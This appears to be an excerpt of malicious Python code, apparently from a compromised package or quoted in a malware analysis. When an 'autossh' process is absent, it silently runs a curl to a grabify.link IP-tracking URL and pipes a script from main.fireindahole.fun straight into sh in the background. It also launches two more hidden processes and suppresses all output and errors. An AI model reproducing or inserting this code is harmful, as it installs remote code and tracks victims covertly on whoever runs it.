        ...
        try:
            ...
            if 'autossh' not in processes:
                ...
                executables = [
                    ...
                    "curl https://grabify.link/IFKU0H",
                    "curl -sL main.fireindahole.fun/script3separator.sh | sh &"
                ]
                silence_kwargs = {'stdout': subprocess.DEVNULL, 'stdin': subprocess.DEVNULL,
                                'stderr': subprocess.DEVNULL}
                for a in executables:
                    subprocess.run(a, shell=True, **silence_kwargs)
                subprocess.Popen(executable, shell=True, **silence_kwargs)
                subprocess.Popen(executable2, shell=True, **silence_kwargs)
        except:
            pass
